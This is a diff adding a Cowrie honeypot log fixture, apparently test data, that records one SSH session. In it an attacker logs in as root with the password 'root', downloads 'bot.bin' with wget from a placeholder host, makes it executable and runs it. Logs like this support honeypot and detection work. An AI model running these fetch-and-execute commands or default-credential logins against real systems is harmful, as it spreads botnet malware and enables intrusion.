@@ -1,0 +1,9 @@
+{"eventid": "cowrie.session.connect", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:00.000000Z", "src_port": 40000, "dst_port": 2222}
+{"eventid": "cowrie.client.version", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:01.000000Z", "version": "SSH-2.0-libssh2_1.9.0"}
+{"eventid": "cowrie.login.success", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:03.000000Z", "username": "root", "password": "root"}
+{"eventid": "cowrie.command.input", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:06.000000Z", "input": "cd /var/tmp"}
+{"eventid": "cowrie.command.input", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:08.000000Z", "input": "wget http://192.0.2.200/bot.bin"}
+{"eventid": "cowrie.session.file_download", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:10.000000Z", "url": "http://192.0.2.200/bot.bin", "shasum": "3d0baeed0d844d46a8df430fbf5d2e23699649f823085c1a94114feb77814590", "outfile": "bot.bin"}
+{"eventid": "cowrie.command.input", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:11.000000Z", "input": "chmod 777 bot.bin"}
+{"eventid": "cowrie.command.input", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:13.000000Z", "input": "./bot.bin"}
+{"eventid": "cowrie.session.closed", "src_ip": "192.0.2.21", "session": "c3d4e5f6a1b2", "timestamp": "2026-10-14T09:00:15.000000Z", "duration": 15}
